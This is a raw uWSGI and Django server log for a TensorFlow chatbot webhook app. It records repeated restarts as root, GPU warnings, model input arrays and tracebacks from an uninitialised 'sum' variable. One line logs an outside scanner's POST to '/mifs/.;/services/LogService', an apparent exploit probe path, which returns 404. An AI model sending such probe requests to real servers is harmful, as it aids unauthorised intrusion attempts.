*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1997, cores: 1)
2020-10-22 05:13:28.170304: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-22 05:13:28.170339: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-22 05:13:36.638429: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-22 05:13:36.638463: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-22 05:13:36.638482: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-22 05:13:36.638693: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-22 05:13:36.664771: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-10-22 05:13:36.665149: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5631439c0d90 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-22 05:13:36.665169: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-22 05:13:36.951686: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-22 05:13:36.953132: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-22 05:13:36.954498: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 1997|app: 0|req: 1/1] 220.68.167.158 () {52 vars in 911 bytes} [Thu Oct 22 05:13:27 2020] GET / => generated 1365 bytes in 9555 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 1997|app: 0|req: 2/2] 220.68.167.158 () {52 vars in 916 bytes} [Thu Oct 22 05:16:22 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['']
['']
[[4353]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4353]]
2020-10-22 05:22:24.047415: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-10-22 05:22:24.350817: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-22 05:22:24.352283: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-22 05:22:24.353716: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
50.05%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 80, in start
    sum+=int(score)
UnboundLocalError: local variable 'sum' referenced before assignment
[pid: 1997|app: 0|req: 3/3] 66.102.6.221 () {42 vars in 540 bytes} [Thu Oct 22 05:22:20 2020] POST /webhook/ => generated 67820 bytes in 4636 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
['', '', '', '']
['', '', '']
[[387, 545, 211]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0 387 545 211]]
50.53%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 82, in start
    sum-=int(score)
UnboundLocalError: local variable 'sum' referenced before assignment
[pid: 1997|app: 0|req: 4/4] 66.102.6.223 () {42 vars in 542 bytes} [Thu Oct 22 05:22:48 2020] POST /webhook/ => generated 67843 bytes in 115 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
['', '', '', '', '']
['', '', '', '', '']
[[129, 441, 9, 13, 13]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0 129 441   9  13  13]]
99.39%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 80, in start
    sum+=int(score)
UnboundLocalError: local variable 'sum' referenced before assignment
[pid: 1997|app: 0|req: 5/5] 66.102.6.223 () {42 vars in 542 bytes} [Thu Oct 22 05:23:03 2020] POST /webhook/ => generated 67928 bytes in 1315 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Oct 22 05:26:44 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x561ffeaabd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x561ffeaabd00 pid: 2104 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2104, cores: 1)
2020-10-22 05:27:02.147298: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-22 05:27:02.147331: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-22 05:27:10.471413: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-22 05:27:10.471443: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-22 05:27:10.471458: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-22 05:27:10.471675: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-22 05:27:10.496742: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-10-22 05:27:10.497112: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x56200399f510 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-22 05:27:10.497131: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-22 05:27:11.325458: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-22 05:27:11.326909: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-22 05:27:11.328290: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 2104|app: 0|req: 1/1] 220.68.167.158 () {52 vars in 911 bytes} [Thu Oct 22 05:27:01 2020] GET / => generated 1365 bytes in 9952 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 2104|app: 0|req: 2/2] 220.68.167.158 () {52 vars in 916 bytes} [Thu Oct 22 05:32:43 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['']
['']
[[13]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0  0  0  0 13]]
2020-10-22 05:32:53.969193: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-10-22 05:32:54.279827: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-22 05:32:54.281382: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-22 05:32:54.282834: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
94.93%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 80, in start
    sum+=int(score)
UnboundLocalError: local variable 'sum' referenced before assignment
[pid: 2104|app: 0|req: 3/3] 66.102.6.221 () {42 vars in 540 bytes} [Thu Oct 22 05:32:49 2020] POST /webhook/ => generated 67827 bytes in 5115 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
['']
['']
[[13]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0  0  0  0 13]]
94.93%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 80, in start
    sum+=int(score)
UnboundLocalError: local variable 'sum' referenced before assignment
[pid: 2104|app: 0|req: 4/4] 66.102.6.221 () {42 vars in 540 bytes} [Thu Oct 22 05:33:00 2020] POST /webhook/ => generated 67827 bytes in 97 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
['', '']
['', '']
[[9, 13]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0  0  0  9 13]]
97.48%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 80, in start
    sum+=int(score)
UnboundLocalError: local variable 'sum' referenced before assignment
[pid: 2104|app: 0|req: 5/5] 66.102.6.221 () {42 vars in 542 bytes} [Thu Oct 22 05:33:07 2020] POST /webhook/ => generated 67857 bytes in 95 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Oct 22 05:33:15 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
probably another instance of uWSGI is running on the same address (:8001).
bind(): Address already in use [core/socket.c line 769]
*** Starting uWSGI 2.0.18 (64bit) on [Thu Oct 22 05:37:48 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55ccb9b03d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55ccb9b03d00 pid: 2210 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2210, cores: 1)
2020-10-22 05:38:27.755268: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-22 05:38:27.755305: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-22 05:38:36.215783: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-22 05:38:36.215814: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-22 05:38:36.215829: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-22 05:38:36.216052: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-22 05:38:36.240977: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-10-22 05:38:36.241368: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55ccbe9f6880 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-22 05:38:36.241383: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-22 05:38:37.070942: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-22 05:38:37.072366: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-22 05:38:37.073754: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 2210|app: 0|req: 1/1] 220.68.167.158 () {52 vars in 911 bytes} [Thu Oct 22 05:38:27 2020] GET / => generated 1365 bytes in 10204 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 2210|app: 0|req: 2/2] 220.68.167.158 () {52 vars in 916 bytes} [Thu Oct 22 05:39:16 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['']
['']
[[4353]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4353]]
2020-10-22 05:39:26.283265: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-10-22 05:39:26.588473: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-22 05:39:26.589973: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-22 05:39:26.591435: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
50.05%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 82, in start
    sum+=int(score)
TypeError: unsupported operand type(s) for +=: 'NoneType' and 'int'
[pid: 2210|app: 0|req: 3/3] 66.249.83.201 () {42 vars in 541 bytes} [Thu Oct 22 05:39:22 2020] POST /webhook/ => generated 67841 bytes in 4653 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
['', '']
['', '']
[[9, 13]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0  0  0  9 13]]
97.48%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 49, in webhook
    return start(queryText)
  File "./haniumapp/views.py", line 82, in start
    sum+=int(score)
TypeError: unsupported operand type(s) for +=: 'NoneType' and 'int'
[pid: 2210|app: 0|req: 4/4] 66.249.83.201 () {42 vars in 543 bytes} [Thu Oct 22 05:39:31 2020] POST /webhook/ => generated 67878 bytes in 848 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
Not Found: /mifs/.;/services/LogService
[pid: 2210|app: 0|req: 5/5] 193.27.229.26 () {40 vars in 653 bytes} [Thu Oct 22 08:18:05 2020] POST /mifs/.;/services/LogService => generated 2383 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
uwsgi_proto_uwsgi_parser(): Connection reset by peer [proto/uwsgi.c line 35]
invalid request block size: 21573 (max 4096)...skip
*** Starting uWSGI 2.0.18 (64bit) on [Fri Oct 23 05:54:41 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55d990b08cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55d990b08cf0 pid: 1988 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1988, cores: 1)
2020-10-23 05:57:48.154122: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-23 05:57:48.154161: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-23 05:58:00.321777: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-23 05:58:00.321808: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-23 05:58:00.321831: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-23 05:58:00.322050: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-23 05:58:00.368888: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-10-23 05:58:00.369320: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55d9959f4610 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-23 05:58:00.369340: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-23 05:58:00.800057: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-23 05:58:00.801593: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
